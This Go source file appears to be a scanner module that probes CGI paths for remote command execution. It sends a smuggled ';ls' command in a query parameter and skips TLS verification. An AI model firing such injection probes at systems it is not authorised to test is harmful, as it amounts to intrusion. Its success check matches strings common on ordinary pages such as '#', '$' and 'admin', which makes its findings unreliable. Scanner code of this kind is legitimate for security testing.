package webserver

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"

	webscan "github.com/Method-Security/webscan/generated/go"
)

type RCEModFileLibrary struct{}

// Expanded paths for mod_cgi, mod_php, and mod_proxy
var commonVulnerablePaths = []string{
	"/test.cgi",
	"/admin.cgi",
	"/login.cgi",
	"/status.cgi",
	"/user.cgi",
	"/printenv.cgi",
	"/cgi-bin/test.cgi",
	"/cgi-bin/admin.cgi",
	"/cgi-bin/login.cgi",
	"/cgi-bin/status.cgi",
	"/cgi-bin/user.cgi",
	"/cgi-bin/printenv.cgi",
}

func (RCEModFileLib *RCEModFileLibrary) ModuleRun(target string, config *webscan.WebServerTypeConfig) (*webscan.Attempt, []string) {
	// Initialize structs
	attempt := webscan.Attempt{Name: webscan.ModuleNameRceModFile, Timestamp: time.Now()}
	errors := []string{}
	findingGlobal := false

	// Payload Params
	params := map[string]string{
		"input": ";ls",
	}

	// Enumerate paths
	var paths []*webscan.PathInfo
	for _, filepath := range commonVulnerablePaths {
		exploitURL := fmt.Sprintf("%s%s?%s=%s", target, filepath, "input", params["input"])
		request := webscan.GeneralRequestInfo{
			Method: webscan.HttpMethodGet,
			Url:    exploitURL,
			Params: params,
		}
		path := webscan.PathInfo{Path: filepath, Request: &request}

		client := &http.Client{
			Timeout: time.Duration(config.Timeout) * time.Millisecond,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		}
		resp, err := client.Get(exploitURL)
		if err != nil {
			errorMessage := err.Error()
			errors = append(errors, errorMessage)
			path.Request = &request
			path.Response = &webscan.GeneralResponseInfo{Error: &errorMessage}
			paths = append(paths, &path)
			continue
		}

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			errors = append(errors, err.Error())
			continue
		}
		bodyStr := string(body)
		response := webscan.GeneralResponseInfo{
			StatusCode: &resp.StatusCode,
			Body:       &bodyStr,
		}

		err = resp.Body.Close()
		if err != nil {
			errors = append(errors, err.Error())
			continue
		}

		path.Request = &request
		path.Response = &response
		finding := RCEModFileLib.AnalyzeResponse(webscan.NewResponseUnionFromGeneralResponse(path.Response))
		path.Finding = &finding
		paths = append(paths, &path)
		findingGlobal = findingGlobal || finding
	}

	// Marshal structs
	PathTraversalAttemptInfo := webscan.MultiplePathsAttemptInfo{Paths: paths}
	attempt.AttemptInfo = webscan.NewAttemptInfoUnionFromMultiplePathsAttempt(&PathTraversalAttemptInfo)
	attempt.Finding = findingGlobal
	return &attempt, errors
}

func (RCEModFileLib *RCEModFileLibrary) AnalyzeResponse(response *webscan.ResponseUnion) bool {
	if response.GeneralResponse.Body == nil {
		return false
	}

	if response.GeneralResponse.StatusCode == nil {
		return false
	}
	body := *response.GeneralResponse.Body
	return containsLSOutput(strings.ToLower(body)) && *response.GeneralResponse.StatusCode == http.StatusOK
}

func containsLSOutput(responseBody string) bool {
	exploitSuccessfulPhrases := []string{"#", "$", "bash", "bin", "cgi-bin", "admin", "scripts", "login", "config"}
	for _, phrase := range exploitSuccessfulPhrases {
		if strings.Contains(responseBody, phrase) {
			return true
		}
	}
	return false
}
